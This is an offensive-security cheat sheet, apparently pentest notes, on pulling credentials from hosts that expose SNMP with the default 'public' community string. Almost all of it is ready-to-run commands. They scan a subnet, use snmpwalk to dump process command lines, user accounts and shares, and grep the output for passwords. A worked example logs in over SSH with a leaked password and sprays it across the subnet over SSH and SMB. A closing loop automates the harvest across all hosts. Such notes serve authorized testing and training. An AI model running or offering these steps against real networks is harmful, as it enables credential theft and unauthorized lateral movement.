# SNMP Exploitation - Credential Extraction

## Detection
```bash
# Find SNMP hosts
sudo nmap -sU -p 161 --open 10.10.10.0/24 -oG snmp_hosts.txt

# Test default community string
snmpwalk -v2c -c public TARGET
```

## Information Extraction

### High-Value OIDs
```bash
# Running processes (PASSWORDS IN COMMAND LINES!)
snmpwalk -v2c -c public TARGET 1.3.6.1.2.1.25.4.2.1.5 > processes.txt

# Installed software
snmpwalk -v2c -c public TARGET 1.3.6.1.2.1.25.6.3.1.2 > software.txt

# User accounts
snmpwalk -v2c -c public TARGET 1.3.6.1.4.1.77.1.2.25 > users.txt

# Storage/mounted shares
snmpwalk -v2c -c public TARGET 1.3.6.1.2.1.25.2.3.1.3 > storage.txt
```

### Credential Hunting
```bash
# Save everything
snmpwalk -v2c -c public TARGET > snmp_full.txt

# Search for passwords
grep -i "password\|passwd\|pwd\|credential\|secret" snmp_full.txt

# Look for scripts (often reveal logic)
grep -i "\.sh\|\.py\|\.pl\|backup\|reset" snmp_full.txt

# Process command lines often have passwords
grep -i "ssh\|mysql\|psql\|--password\|-p" snmp_full.txt
```

## Real Example Pattern

```
SNMP reveals: "backup.sh --user backup --password BackupPass2024!"

Immediate test:
ssh backup@TARGET  # Password: BackupPass2024!
# Success :O

Test password everywhere:
netexec ssh 10.10.10.0/24 -u backup -p 'BackupPass2024!'
netexec smb 10.10.10.0/24 -u backup -p 'BackupPass2024!'
```

## Automated Extraction

```bash
# Check all SNMP hosts for credentials
for ip in $(grep open snmp_hosts.txt | cut -d' ' -f2); do
    echo "[*] Checking $ip"
    snmpwalk -v2c -c public $ip > snmp_$ip.txt
    grep -i "password" snmp_$ip.txt && echo "*** FOUND PASSWORD ON $ip ***"
done
```
